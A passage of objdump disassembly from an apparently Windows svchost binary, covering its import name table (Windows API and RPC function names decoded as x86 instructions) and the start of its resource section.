 10036c6:	6c                   	insb   (%dx),%es:(%edi)
 10036c7:	46                   	inc    %esi
 10036c8:	72 65                	jb     0x100372f
 10036ca:	65 00 3b             	add    %bh,%gs:(%ebx)
 10036cd:	01 47 65             	add    %eax,0x65(%edi)
 10036d0:	74 43                	je     0x1003715
 10036d2:	75 72                	jne    0x1003746
 10036d4:	72 65                	jb     0x100373b
 10036d6:	6e                   	outsb  %ds:(%esi),(%dx)
 10036d7:	74 50                	je     0x1003729
 10036d9:	72 6f                	jb     0x100374a
 10036db:	63 65 73             	arpl   %esp,0x73(%ebp)
 10036de:	73 00                	jae    0x10036e0
 10036e0:	3d 01 47 65 74       	cmp    $0x74654701,%eax
 10036e5:	43                   	inc    %ebx
 10036e6:	75 72                	jne    0x100375a
 10036e8:	72 65                	jb     0x100374f
 10036ea:	6e                   	outsb  %ds:(%esi),(%dx)
 10036eb:	74 54                	je     0x1003741
 10036ed:	68 72 65 61 64       	push   $0x64616572
 10036f2:	00 00                	add    %al,(%eax)
 10036f4:	97                   	xchg   %eax,%edi
 10036f5:	01 47 65             	add    %eax,0x65(%edi)
 10036f8:	74 50                	je     0x100374a
 10036fa:	72 6f                	jb     0x100376b
 10036fc:	63 41 64             	arpl   %eax,0x64(%ecx)
 10036ff:	64 72 65             	fs jb  0x1003767
 1003702:	73 73                	jae    0x1003777
 1003704:	00 00                	add    %al,(%eax)
 1003706:	43                   	inc    %ebx
 1003707:	02 4c 6f 61          	add    0x61(%edi,%ebp,2),%cl
 100370b:	64 4c                	fs dec %esp
 100370d:	69 62 72 61 72 79 45 	imul   $0x45797261,0x72(%edx),%esp
 1003714:	78 57                	js     0x100376d
 1003716:	00 00                	add    %al,(%eax)
 1003718:	40                   	inc    %eax
 1003719:	02 4c 65 61          	add    0x61(%ebp,%eiz,2),%cl
 100371d:	76 65                	jbe    0x1003784
 100371f:	43                   	inc    %ebx
 1003720:	72 69                	jb     0x100378b
 1003722:	74 69                	je     0x100378d
 1003724:	63 61 6c             	arpl   %esp,0x6c(%ecx)
 1003727:	53                   	push   %ebx
 1003728:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
 100372d:	6e                   	outsb  %ds:(%esi),(%dx)
 100372e:	00 00                	add    %al,(%eax)
 1003730:	02 02                	add    (%edx),%al
 1003732:	48                   	dec    %eax
 1003733:	65 61                	gs popa
 1003735:	70 41                	jo     0x1003778
 1003737:	6c                   	insb   (%dx),%es:(%edi)
 1003738:	6c                   	insb   (%dx),%es:(%edi)
 1003739:	6f                   	outsl  %ds:(%esi),(%dx)
 100373a:	63 00                	arpl   %eax,(%eax)
 100373c:	96                   	xchg   %eax,%esi
 100373d:	00 45 6e             	add    %al,0x6e(%ebp)
 1003740:	74 65                	je     0x10037a7
 1003742:	72 43                	jb     0x1003787
 1003744:	72 69                	jb     0x10037af
 1003746:	74 69                	je     0x10037b1
 1003748:	63 61 6c             	arpl   %esp,0x6c(%ecx)
 100374b:	53                   	push   %ebx
 100374c:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
 1003751:	6e                   	outsb  %ds:(%esi),(%dx)
 1003752:	00 00                	add    %al,(%eax)
 1003754:	34 02                	xor    $0x2,%al
 1003756:	4c                   	dec    %esp
 1003757:	43                   	inc    %ebx
 1003758:	4d                   	dec    %ebp
 1003759:	61                   	popa
 100375a:	70 53                	jo     0x10037af
 100375c:	74 72                	je     0x10037d0
 100375e:	69 6e 67 57 00 00 f0 	imul   $0xf0000057,0x67(%esi),%ebp
 1003765:	00 46 72             	add    %al,0x72(%esi)
 1003768:	65 65 4c             	gs gs dec %esp
 100376b:	69 62 72 61 72 79 00 	imul   $0x797261,0x72(%edx),%esp
 1003772:	ae                   	scas   %es:(%edi),%al
 1003773:	03 6c 73 74          	add    0x74(%ebx,%esi,2),%ebp
 1003777:	72 63                	jb     0x10037dc
 1003779:	70 79                	jo     0x10037f4
 100377b:	57                   	push   %edi
 100377c:	00 00                	add    %al,(%eax)
 100377e:	ba 00 45 78 70       	mov    $0x70784500,%edx
 1003783:	61                   	popa
 1003784:	6e                   	outsb  %ds:(%esi),(%dx)
 1003785:	64 45                	fs inc %ebp
 1003787:	6e                   	outsb  %ds:(%esi),(%dx)
 1003788:	76 69                	jbe    0x10037f3
 100378a:	72 6f                	jb     0x10037fb
 100378c:	6e                   	outsb  %ds:(%esi),(%dx)
 100378d:	6d                   	insl   (%dx),%es:(%edi)
 100378e:	65 6e                	outsb  %gs:(%esi),(%dx)
 1003790:	74 53                	je     0x10037e5
 1003792:	74 72                	je     0x1003806
 1003794:	69 6e 67 73 57 00 ab 	imul   $0xab005773,0x67(%esi),%ebp
 100379b:	03 6c 73 74          	add    0x74(%ebx,%esi,2),%ebp
 100379f:	72 63                	jb     0x1003804
 10037a1:	6d                   	insl   (%dx),%es:(%edi)
 10037a2:	70 69                	jo     0x100380d
 10037a4:	57                   	push   %edi
 10037a5:	00 b6 00 45 78 69    	add    %dh,0x69784500(%esi)
 10037ab:	74 50                	je     0x10037fd
 10037ad:	72 6f                	jb     0x100381e
 10037af:	63 65 73             	arpl   %esp,0x73(%ebp)
 10037b2:	73 00                	jae    0x10037b4
 10037b4:	0a 01                	or     (%ecx),%al
 10037b6:	47                   	inc    %edi
 10037b7:	65 74 43             	gs je  0x10037fd
 10037ba:	6f                   	outsl  %ds:(%esi),(%dx)
 10037bb:	6d                   	insl   (%dx),%es:(%edi)
 10037bc:	6d                   	insl   (%dx),%es:(%edi)
 10037bd:	61                   	popa
 10037be:	6e                   	outsb  %ds:(%esi),(%dx)
 10037bf:	64 4c                	fs dec %esp
 10037c1:	69 6e 65 57 00 15 02 	imul   $0x2150057,0x65(%esi),%ebp
 10037c8:	49                   	dec    %ecx
 10037c9:	6e                   	outsb  %ds:(%esi),(%dx)
 10037ca:	69 74 69 61 6c 69 7a 	imul   $0x657a696c,0x61(%ecx,%ebp,2),%esi
 10037d1:	65 
 10037d2:	43                   	inc    %ebx
 10037d3:	72 69                	jb     0x100383e
 10037d5:	74 69                	je     0x1003840
 10037d7:	63 61 6c             	arpl   %esp,0x6c(%ecx)
 10037da:	53                   	push   %ebx
 10037db:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
 10037e0:	6e                   	outsb  %ds:(%esi),(%dx)
 10037e1:	00 9a 01 47 65 74    	add    %bl,0x74654701(%edx)
 10037e7:	50                   	push   %eax
 10037e8:	72 6f                	jb     0x1003859
 10037ea:	63 65 73             	arpl   %esp,0x73(%ebp)
 10037ed:	73 48                	jae    0x1003837
 10037ef:	65 61                	gs popa
 10037f1:	70 00                	jo     0x10037f3
 10037f3:	00 00                	add    %al,(%eax)
 10037f5:	03 53 65             	add    0x65(%ebx),%edx
 10037f8:	74 45                	je     0x100383f
 10037fa:	72 72                	jb     0x100386e
 10037fc:	6f                   	outsl  %ds:(%esi),(%dx)
 10037fd:	72 4d                	jb     0x100384c
 10037ff:	6f                   	outsl  %ds:(%esi),(%dx)
 1003800:	64 65 00 00          	fs add %al,%gs:(%eax)
 1003804:	32 03                	xor    (%ebx),%al
 1003806:	53                   	push   %ebx
 1003807:	65 74 55             	gs je  0x100385f
 100380a:	6e                   	outsb  %ds:(%esi),(%dx)
 100380b:	68 61 6e 64 6c       	push   $0x6c646e61
 1003810:	65 64 45             	gs fs inc %ebp
 1003813:	78 63                	js     0x1003878
 1003815:	65 70 74             	gs jo  0x100388c
 1003818:	69 6f 6e 46 69 6c 74 	imul   $0x746c6946,0x6e(%edi),%ebp
 100381f:	65 72 00             	gs jb  0x1003822
 1003822:	ab                   	stos   %eax,%es:(%edi)
 1003823:	02 52 65             	add    0x65(%edx),%dl
 1003826:	67 69 73 74 65 72 57 	imul   $0x61577265,0x74(%bp,%di),%esi
 100382d:	61 
 100382e:	69 74 46 6f 72 53 69 	imul   $0x6e695372,0x6f(%esi,%eax,2),%esi
 1003835:	6e 
 1003836:	67 6c                	insb   (%dx),%es:(%di)
 1003838:	65 4f                	gs dec %edi
 100383a:	62 6a 65             	bound  %ebp,0x65(%edx)
 100383d:	63 74 00 18          	arpl   %esi,0x18(%eax,%eax,1)
 1003841:	02 49 6e             	add    0x6e(%ecx),%cl
 1003844:	74 65                	je     0x10038ab
 1003846:	72 6c                	jb     0x10038b4
 1003848:	6f                   	outsl  %ds:(%esi),(%dx)
 1003849:	63 6b 65             	arpl   %ebp,0x65(%ebx)
 100384c:	64 43                	fs inc %ebx
 100384e:	6f                   	outsl  %ds:(%esi),(%dx)
 100384f:	6d                   	insl   (%dx),%es:(%edi)
 1003850:	70 61                	jo     0x10038b3
 1003852:	72 65                	jb     0x10038b9
 1003854:	45                   	inc    %ebp
 1003855:	78 63                	js     0x10038ba
 1003857:	68 61 6e 67 65       	push   $0x65676e61
 100385c:	00 00                	add    %al,(%eax)
 100385e:	41                   	inc    %ecx
 100385f:	02 4c 6f 61          	add    0x61(%edi,%ebp,2),%cl
 1003863:	64 4c                	fs dec %esp
 1003865:	69 62 72 61 72 79 41 	imul   $0x41797261,0x72(%edx),%esp
 100386c:	00 00                	add    %al,(%eax)
 100386e:	91                   	xchg   %eax,%ecx
 100386f:	02 51 75             	add    0x75(%ecx),%dl
 1003872:	65 72 79             	gs jb  0x10038ee
 1003875:	50                   	push   %eax
 1003876:	65 72 66             	gs jb  0x10038df
 1003879:	6f                   	outsl  %ds:(%esi),(%dx)
 100387a:	72 6d                	jb     0x10038e9
 100387c:	61                   	popa
 100387d:	6e                   	outsb  %ds:(%esi),(%dx)
 100387e:	63 65 43             	arpl   %esp,0x43(%ebp)
 1003881:	6f                   	outsl  %ds:(%esi),(%dx)
 1003882:	75 6e                	jne    0x10038f2
 1003884:	74 65                	je     0x10038eb
 1003886:	72 00                	jb     0x1003888
 1003888:	d1 01                	roll   $1,(%ecx)
 100388a:	47                   	inc    %edi
 100388b:	65 74 54             	gs je  0x10038e2
 100388e:	69 63 6b 43 6f 75 6e 	imul   $0x6e756f43,0x6b(%ebx),%esp
 1003895:	74 00                	je     0x1003897
 1003897:	00 3e                	add    %bh,(%esi)
 1003899:	01 47 65             	add    %eax,0x65(%edi)
 100389c:	74 43                	je     0x10038e1
 100389e:	75 72                	jne    0x1003912
 10038a0:	72 65                	jb     0x1003907
 10038a2:	6e                   	outsb  %ds:(%esi),(%dx)
 10038a3:	74 54                	je     0x10038f9
 10038a5:	68 72 65 61 64       	push   $0x64616572
 10038aa:	49                   	dec    %ecx
 10038ab:	64 00 00             	add    %al,%fs:(%eax)
 10038ae:	3c 01                	cmp    $0x1,%al
 10038b0:	47                   	inc    %edi
 10038b1:	65 74 43             	gs je  0x10038f7
 10038b4:	75 72                	jne    0x1003928
 10038b6:	72 65                	jb     0x100391d
 10038b8:	6e                   	outsb  %ds:(%esi),(%dx)
 10038b9:	74 50                	je     0x100390b
 10038bb:	72 6f                	jb     0x100392c
 10038bd:	63 65 73             	arpl   %esp,0x73(%ebp)
 10038c0:	73 49                	jae    0x100390b
 10038c2:	64 00 bd 01 47 65 74 	add    %bh,%fs:0x74654701(%ebp)
 10038c9:	53                   	push   %ebx
 10038ca:	79 73                	jns    0x100393f
 10038cc:	74 65                	je     0x1003933
 10038ce:	6d                   	insl   (%dx),%es:(%edi)
 10038cf:	54                   	push   %esp
 10038d0:	69 6d 65 41 73 46 69 	imul   $0x69467341,0x65(%ebp),%ebp
 10038d7:	6c                   	insb   (%dx),%es:(%edi)
 10038d8:	65 54                	gs push %esp
 10038da:	69 6d 65 00 46 03 54 	imul   $0x54034600,0x65(%ebp),%ebp
 10038e1:	65 72 6d             	gs jb  0x1003951
 10038e4:	69 6e 61 74 65 50 72 	imul   $0x72506574,0x61(%esi),%ebp
 10038eb:	6f                   	outsl  %ds:(%esi),(%dx)
 10038ec:	63 65 73             	arpl   %esp,0x73(%ebp)
 10038ef:	73 00                	jae    0x10038f1
 10038f1:	00 57 03             	add    %dl,0x3(%edi)
 10038f4:	55                   	push   %ebp
 10038f5:	6e                   	outsb  %ds:(%esi),(%dx)
 10038f6:	68 61 6e 64 6c       	push   $0x6c646e61
 10038fb:	65 64 45             	gs fs inc %ebp
 10038fe:	78 63                	js     0x1003963
 1003900:	65 70 74             	gs jo  0x1003977
 1003903:	69 6f 6e 46 69 6c 74 	imul   $0x746c6946,0x6e(%edi),%ebp
 100390a:	65 72 00             	gs jb  0x100390d
 100390d:	00 47 02             	add    %al,0x2(%edi)
 1003910:	4c                   	dec    %esp
 1003911:	6f                   	outsl  %ds:(%esi),(%dx)
 1003912:	63 61 6c             	arpl   %esp,0x6c(%ecx)
 1003915:	41                   	inc    %ecx
 1003916:	6c                   	insb   (%dx),%es:(%edi)
 1003917:	6c                   	insb   (%dx),%es:(%edi)
 1003918:	6f                   	outsl  %ds:(%esi),(%dx)
 1003919:	63 00                	arpl   %eax,(%eax)
 100391b:	00 a8 03 6c 73 74    	add    %ch,0x74736c03(%eax)
 1003921:	72 63                	jb     0x1003986
 1003923:	6d                   	insl   (%dx),%es:(%edi)
 1003924:	70 57                	jo     0x100397d
 1003926:	00 00                	add    %al,(%eax)
 1003928:	7d 00                	jge    0x100392a
 100392a:	44                   	inc    %esp
 100392b:	65 6c                	gs insb (%dx),%es:(%edi)
 100392d:	61                   	popa
 100392e:	79 4c                	jns    0x100397c
 1003930:	6f                   	outsl  %ds:(%esi),(%dx)
 1003931:	61                   	popa
 1003932:	64 46                	fs inc %esi
 1003934:	61                   	popa
 1003935:	69 6c 75 72 65 48 6f 	imul   $0x6f6f4865,0x72(%ebp,%esi,2),%ebp
 100393c:	6f 
 100393d:	6b 00 00             	imul   $0x0,(%eax),%eax
 1003940:	fa                   	cli
 1003941:	00 4e 74             	add    %cl,0x74(%esi)
 1003944:	51                   	push   %ecx
 1003945:	75 65                	jne    0x10039ac
 1003947:	72 79                	jb     0x10039c2
 1003949:	53                   	push   %ebx
 100394a:	65 63 75 72          	arpl   %esi,%gs:0x72(%ebp)
 100394e:	69 74 79 4f 62 6a 65 	imul   $0x63656a62,0x4f(%ecx,%edi,2),%esi
 1003955:	63 
 1003956:	74 00                	je     0x1003958
 1003958:	40                   	inc    %eax
 1003959:	02 52 74             	add    0x74(%edx),%dl
 100395c:	6c                   	insb   (%dx),%es:(%edi)
 100395d:	46                   	inc    %esi
 100395e:	72 65                	jb     0x10039c5
 1003960:	65 48                	gs dec %eax
 1003962:	65 61                	gs popa
 1003964:	70 00                	jo     0x1003966
 1003966:	c7 00 4e 74 4f 70    	movl   $0x704f744e,(%eax)
 100396c:	65 6e                	outsb  %gs:(%esi),(%dx)
 100396e:	4b                   	dec    %ebx
 100396f:	65 79 00             	gs jns 0x1003972
 1003972:	13 05 77 63 73 63    	adc    0x63736377,%eax
 1003978:	61                   	popa
 1003979:	74 00                	je     0x100397b
 100397b:	00 16                	add    %dl,(%esi)
 100397d:	05 77 63 73 63       	add    $0x63736377,%eax
 1003982:	70 79                	jo     0x10039fd
 1003984:	00 00                	add    %al,(%eax)
 1003986:	8e 01                	mov    (%ecx),%es
 1003988:	52                   	push   %edx
 1003989:	74 6c                	je     0x10039f7
 100398b:	41                   	inc    %ecx
 100398c:	6c                   	insb   (%dx),%es:(%edi)
 100398d:	6c                   	insb   (%dx),%es:(%edi)
 100398e:	6f                   	outsl  %ds:(%esi),(%dx)
 100398f:	63 61 74             	arpl   %esp,0x74(%ecx)
 1003992:	65 48                	gs dec %eax
 1003994:	65 61                	gs popa
 1003996:	70 00                	jo     0x1003998
 1003998:	b0 01                	mov    $0x1,%al
 100399a:	52                   	push   %edx
 100399b:	74 6c                	je     0x1003a09
 100399d:	43                   	inc    %ebx
 100399e:	6f                   	outsl  %ds:(%esi),(%dx)
 100399f:	6d                   	insl   (%dx),%es:(%edi)
 10039a0:	70 61                	jo     0x1003a03
 10039a2:	72 65                	jb     0x1003a09
 10039a4:	55                   	push   %ebp
 10039a5:	6e                   	outsb  %ds:(%esi),(%dx)
 10039a6:	69 63 6f 64 65 53 74 	imul   $0x74536564,0x6f(%ebx),%esp
 10039ad:	72 69                	jb     0x1003a18
 10039af:	6e                   	outsb  %ds:(%esi),(%dx)
 10039b0:	67 00 76 02          	add    %dh,0x2(%bp)
 10039b4:	52                   	push   %edx
 10039b5:	74 6c                	je     0x1003a23
 10039b7:	49                   	dec    %ecx
 10039b8:	6e                   	outsb  %ds:(%esi),(%dx)
 10039b9:	69 74 55 6e 69 63 6f 	imul   $0x646f6369,0x6e(%ebp,%edx,2),%esi
 10039c0:	64 
 10039c1:	65 53                	gs push %ebx
 10039c3:	74 72                	je     0x1003a37
 10039c5:	69 6e 67 00 00 84 02 	imul   $0x2840000,0x67(%esi),%ebp
 10039cc:	52                   	push   %edx
 10039cd:	74 6c                	je     0x1003a3b
 10039cf:	49                   	dec    %ecx
 10039d0:	6e                   	outsb  %ds:(%esi),(%dx)
 10039d1:	69 74 69 61 6c 69 7a 	imul   $0x657a696c,0x61(%ecx,%ebp,2),%esi
 10039d8:	65 
 10039d9:	53                   	push   %ebx
 10039da:	69 64 00 00 b3 02 52 	imul   $0x745202b3,0x0(%eax,%eax,1),%esp
 10039e1:	74 
 10039e2:	6c                   	insb   (%dx),%es:(%edi)
 10039e3:	4c                   	dec    %esp
 10039e4:	65 6e                	outsb  %gs:(%esi),(%dx)
 10039e6:	67 74 68             	addr16 je 0x1003a51
 10039e9:	52                   	push   %edx
 10039ea:	65 71 75             	gs jno 0x1003a62
 10039ed:	69 72 65 64 53 69 64 	imul   $0x64695364,0x65(%edx),%esi
 10039f4:	00 00                	add    %al,(%eax)
 10039f6:	2e 03 52 74          	add    %cs:0x74(%edx),%edx
 10039fa:	6c                   	insb   (%dx),%es:(%edi)
 10039fb:	53                   	push   %ebx
 10039fc:	75 62                	jne    0x1003a60
 10039fe:	41                   	inc    %ecx
 10039ff:	75 74                	jne    0x1003a75
 1003a01:	68 6f 72 69 74       	push   $0x7469726f
 1003a06:	79 53                	jns    0x1003a5b
 1003a08:	69 64 00 00 67 00 4e 	imul   $0x744e0067,0x0(%eax,%eax,1),%esp
 1003a0f:	74 
 1003a10:	43                   	inc    %ebx
 1003a11:	6c                   	insb   (%dx),%es:(%edi)
 1003a12:	6f                   	outsl  %ds:(%esi),(%dx)
 1003a13:	73 65                	jae    0x1003a7a
 1003a15:	00 2d 03 52 74 6c    	add    %ch,0x6c745203
 1003a1b:	53                   	push   %ebx
 1003a1c:	75 62                	jne    0x1003a80
 1003a1e:	41                   	inc    %ecx
 1003a1f:	75 74                	jne    0x1003a95
 1003a21:	68 6f 72 69 74       	push   $0x7469726f
 1003a26:	79 43                	jns    0x1003a6b
 1003a28:	6f                   	outsl  %ds:(%esi),(%dx)
 1003a29:	75 6e                	jne    0x1003a99
 1003a2b:	74 53                	je     0x1003a80
 1003a2d:	69 64 00 50 02 52 74 	imul   $0x6c745202,0x50(%eax,%eax,1),%esp
 1003a34:	6c 
 1003a35:	47                   	inc    %edi
 1003a36:	65 74 44             	gs je  0x1003a7d
 1003a39:	61                   	popa
 1003a3a:	63 6c 53 65          	arpl   %ebp,0x65(%ebx,%edx,2)
 1003a3e:	63 75 72             	arpl   %esi,0x72(%ebp)
 1003a41:	69 74 79 44 65 73 63 	imul   $0x72637365,0x44(%ecx,%edi,2),%esi
 1003a48:	72 
 1003a49:	69 70 74 6f 72 00 00 	imul   $0x726f,0x74(%eax),%esi
 1003a50:	e2 02                	loop   0x1003a54
 1003a52:	52                   	push   %edx
 1003a53:	74 6c                	je     0x1003ac1
 1003a55:	51                   	push   %ecx
 1003a56:	75 65                	jne    0x1003abd
 1003a58:	72 79                	jb     0x1003ad3
 1003a5a:	49                   	dec    %ecx
 1003a5b:	6e                   	outsb  %ds:(%esi),(%dx)
 1003a5c:	66 6f                	outsw  %ds:(%esi),(%dx)
 1003a5e:	72 6d                	jb     0x1003acd
 1003a60:	61                   	popa
 1003a61:	74 69                	je     0x1003acc
 1003a63:	6f                   	outsl  %ds:(%esi),(%dx)
 1003a64:	6e                   	outsb  %ds:(%esi),(%dx)
 1003a65:	41                   	inc    %ecx
 1003a66:	63 6c 00 00          	arpl   %ebp,0x0(%eax,%eax,1)
 1003a6a:	49                   	dec    %ecx
 1003a6b:	02 52 74             	add    0x74(%edx),%dl
 1003a6e:	6c                   	insb   (%dx),%es:(%edi)
 1003a6f:	47                   	inc    %edi
 1003a70:	65 74 41             	gs je  0x1003ab4
 1003a73:	63 65 00             	arpl   %esp,0x0(%ebp)
 1003a76:	6c                   	insb   (%dx),%es:(%edi)
 1003a77:	02 52 74             	add    0x74(%edx),%dl
 1003a7a:	6c                   	insb   (%dx),%es:(%edi)
 1003a7b:	49                   	dec    %ecx
 1003a7c:	6d                   	insl   (%dx),%es:(%edi)
 1003a7d:	61                   	popa
 1003a7e:	67 65 4e             	addr16 gs dec %esi
 1003a81:	74 48                	je     0x1003acb
 1003a83:	65 61                	gs popa
 1003a85:	64 65 72 00          	fs gs jb 0x1003a89
 1003a89:	00 18                	add    %bl,(%eax)
 1003a8b:	05 77 63 73 6c       	add    $0x6c736377,%eax
 1003a90:	65 6e                	outsb  %gs:(%esi),(%dx)
 1003a92:	00 00                	add    %al,(%eax)
 1003a94:	42                   	inc    %edx
 1003a95:	03 52 74             	add    0x74(%edx),%edx
 1003a98:	6c                   	insb   (%dx),%es:(%edi)
 1003a99:	55                   	push   %ebp
 1003a9a:	6e                   	outsb  %ds:(%esi),(%dx)
 1003a9b:	68 61 6e 64 6c       	push   $0x6c646e61
 1003aa0:	65 64 45             	gs fs inc %ebp
 1003aa3:	78 63                	js     0x1003b08
 1003aa5:	65 70 74             	gs jo  0x1003b1c
 1003aa8:	69 6f 6e 46 69 6c 74 	imul   $0x746c6946,0x6e(%edi),%ebp
 1003aaf:	65 72 00             	gs jb  0x1003ab2
 1003ab2:	c5 01                	lds    (%ecx),%eax
 1003ab4:	52                   	push   %edx
 1003ab5:	74 6c                	je     0x1003b23
 1003ab7:	43                   	inc    %ebx
 1003ab8:	6f                   	outsl  %ds:(%esi),(%dx)
 1003ab9:	70 79                	jo     0x1003b34
 1003abb:	53                   	push   %ebx
 1003abc:	69 64 00 00 aa 01 52 	imul   $0x705201aa,0x0(%eax,%eax,1),%esp
 1003ac3:	70 
 1003ac4:	63 53 65             	arpl   %edx,0x65(%ebx)
 1003ac7:	72 76                	jb     0x1003b3f
 1003ac9:	65 72 55             	gs jb  0x1003b21
 1003acc:	6e                   	outsb  %ds:(%esi),(%dx)
 1003acd:	72 65                	jb     0x1003b34
 1003acf:	67 69 73 74 65 72 49 	imul   $0x66497265,0x74(%bp,%di),%esi
 1003ad6:	66 
 1003ad7:	45                   	inc    %ebp
 1003ad8:	78 00                	js     0x1003ada
 1003ada:	8c 01                	mov    %es,(%ecx)
 1003adc:	52                   	push   %edx
 1003add:	70 63                	jo     0x1003b42
 1003adf:	4d                   	dec    %ebp
 1003ae0:	67 6d                	insl   (%dx),%es:(%di)
 1003ae2:	74 57                	je     0x1003b3b
 1003ae4:	61                   	popa
 1003ae5:	69 74 53 65 72 76 65 	imul   $0x72657672,0x65(%ebx,%edx,2),%esi
 1003aec:	72 
 1003aed:	4c                   	dec    %esp
 1003aee:	69 73 74 65 6e 00 89 	imul   $0x89006e65,0x74(%ebx),%esi
 1003af5:	01 52 70             	add    %edx,0x70(%edx)
 1003af8:	63 4d 67             	arpl   %ecx,0x67(%ebp)
 1003afb:	6d                   	insl   (%dx),%es:(%edi)
 1003afc:	74 53                	je     0x1003b51
 1003afe:	65 74 53             	gs je  0x1003b54
 1003b01:	65 72 76             	gs jb  0x1003b7a
 1003b04:	65 72 53             	gs jb  0x1003b5a
 1003b07:	74 61                	je     0x1003b6a
 1003b09:	63 6b 53             	arpl   %ebp,0x53(%ebx)
 1003b0c:	69 7a 65 00 a9 01 52 	imul   $0x5201a900,0x65(%edx),%edi
 1003b13:	70 63                	jo     0x1003b78
 1003b15:	53                   	push   %ebx
 1003b16:	65 72 76             	gs jb  0x1003b8f
 1003b19:	65 72 55             	gs jb  0x1003b71
 1003b1c:	6e                   	outsb  %ds:(%esi),(%dx)
 1003b1d:	72 65                	jb     0x1003b84
 1003b1f:	67 69 73 74 65 72 49 	imul   $0x66497265,0x74(%bp,%di),%esi
 1003b26:	66 
 1003b27:	00 a2 01 52 70 63    	add    %ah,0x63705201(%edx)
 1003b2d:	53                   	push   %ebx
 1003b2e:	65 72 76             	gs jb  0x1003ba7
 1003b31:	65 72 4c             	gs jb  0x1003b80
 1003b34:	69 73 74 65 6e 00 b3 	imul   $0xb3006e65,0x74(%ebx),%esi
 1003b3b:	01 52 70             	add    %edx,0x70(%edx)
 1003b3e:	63 53 65             	arpl   %edx,0x65(%ebx)
 1003b41:	72 76                	jb     0x1003bb9
 1003b43:	65 72 55             	gs jb  0x1003b9b
 1003b46:	73 65                	jae    0x1003bad
 1003b48:	50                   	push   %eax
 1003b49:	72 6f                	jb     0x1003bba
 1003b4b:	74 73                	je     0x1003bc0
 1003b4d:	65 71 45             	gs jno 0x1003b95
 1003b50:	70 57                	jo     0x1003ba9
 1003b52:	00 00                	add    %al,(%eax)
 1003b54:	a5                   	movsl  %ds:(%esi),%es:(%edi)
 1003b55:	01 52 70             	add    %edx,0x70(%edx)
 1003b58:	63 53 65             	arpl   %edx,0x65(%ebx)
 1003b5b:	72 76                	jb     0x1003bd3
 1003b5d:	65 72 52             	gs jb  0x1003bb2
 1003b60:	65 67 69 73 74 65 72 	imul   $0x66497265,%gs:0x74(%bp,%di),%esi
 1003b67:	49 66 
 1003b69:	00 36                	add    %dh,(%esi)
 1003b6b:	00 49 5f             	add    %cl,0x5f(%ecx)
 1003b6e:	52                   	push   %edx
 1003b6f:	70 63                	jo     0x1003bd4
 1003b71:	4d                   	dec    %ebp
 1003b72:	61                   	popa
 1003b73:	70 57                	jo     0x1003bcc
 1003b75:	69 6e 33 32 53 74 61 	imul   $0x61745332,0x33(%esi),%ebp
 1003b7c:	74 75                	je     0x1003bf3
 1003b7e:	73 00                	jae    0x1003b80
 1003b80:	8b 01                	mov    (%ecx),%eax
 1003b82:	52                   	push   %edx
 1003b83:	70 63                	jo     0x1003be8
 1003b85:	4d                   	dec    %ebp
 1003b86:	67 6d                	insl   (%dx),%es:(%di)
 1003b88:	74 53                	je     0x1003bdd
 1003b8a:	74 6f                	je     0x1003bfb
 1003b8c:	70 53                	jo     0x1003be1
 1003b8e:	65 72 76             	gs jb  0x1003c07
 1003b91:	65 72 4c             	gs jb  0x1003be0
 1003b94:	69 73 74 65 6e 69 6e 	imul   $0x6e696e65,0x74(%ebx),%esi
 1003b9b:	67 00 00             	add    %al,(%bx,%si)
 1003b9e:	90                   	nop
 1003b9f:	90                   	nop
 1003ba0:	00 00                	add    %al,(%eax)
 1003ba2:	00 00                	add    %al,(%eax)
 1003ba4:	d6                   	salc
 1003ba5:	7e 10                	jle    0x1003bb7
 1003ba7:	41                   	inc    %ecx
 1003ba8:	00 00                	add    %al,(%eax)
 1003baa:	00 00                	add    %al,(%eax)
 1003bac:	02 00                	add    (%eax),%al
 1003bae:	00 00                	add    %al,(%eax)
 1003bb0:	24 00                	and    $0x0,%al
 1003bb2:	00 00                	add    %al,(%eax)
 1003bb4:	dc 3b                	fdivrl (%ebx)
 1003bb6:	00 00                	add    %al,(%eax)
 1003bb8:	dc 2f                	fsubrl (%edi)
 1003bba:	00 00                	add    %al,(%eax)
 1003bbc:	00 00                	add    %al,(%eax)
 1003bbe:	00 00                	add    %al,(%eax)
 1003bc0:	d6                   	salc
 1003bc1:	7e 10                	jle    0x1003bd3
 1003bc3:	41                   	inc    %ecx
 1003bc4:	25 02 70 0d 0a       	and    $0xa0d7002,%eax
 1003bc9:	00 00                	add    %al,(%eax)
 1003bcb:	00 04 00             	add    %al,(%eax,%eax,1)
 1003bce:	00 00                	add    %al,(%eax)
 1003bd0:	d8 3b                	fdivrs (%ebx)
 1003bd2:	00 00                	add    %al,(%eax)
 1003bd4:	d8 2f                	fsubrs (%edi)
 1003bd6:	00 00                	add    %al,(%eax)
 1003bd8:	70 0d                	jo     0x1003be7
 1003bda:	03 bb 52 53 44 53    	add    0x53445352(%ebx),%edi
 1003be0:	19 3a                	sbb    %edi,(%edx)
 1003be2:	7c 7a                	jl     0x1003c5e
 1003be4:	03 24 38             	add    (%eax,%edi,1),%esp
 1003be7:	4c                   	dec    %esp
 1003be8:	9a e3 e5 dc b0 c6 9c 	lcall  $0x9cc6,$0xb0dce5e3
 1003bef:	49                   	dec    %ecx
 1003bf0:	02 00                	add    (%eax),%al
 1003bf2:	00 00                	add    %al,(%eax)
 1003bf4:	73 76                	jae    0x1003c6c
 1003bf6:	63 68 6f             	arpl   %ebp,0x6f(%eax)
 1003bf9:	73 74                	jae    0x1003c6f
 1003bfb:	2e 70 64             	jo,pn  0x1003c62
 1003bfe:	62 00                	bound  %eax,(%eax)

Disassembly of section .rsrc:

01005000 <.rsrc>:
	...
 100500c:	00 00                	add    %al,(%eax)
 100500e:	01 00                	add    %eax,(%eax)
 1005010:	10 00                	adc    %al,(%eax)
 1005012:	00 00                	add    %al,(%eax)
 1005014:	18 00                	sbb    %al,(%eax)
 1005016:	00 80 00 00 00 00    	add    %al,0x0(%eax)
	...
 1005024:	00 00                	add    %al,(%eax)
 1005026:	01 00                	add    %eax,(%eax)
 1005028:	01 00                	add    %eax,(%eax)
 100502a:	00 00                	add    %al,(%eax)
 100502c:	30 00                	xor    %al,(%eax)
 100502e:	00 80 00 00 00 00    	add    %al,0x0(%eax)
	...
 100503c:	00 00                	add    %al,(%eax)
 100503e:	01 00                	add    %eax,(%eax)
 1005040:	09 04 00             	or     %eax,(%eax,%eax,1)
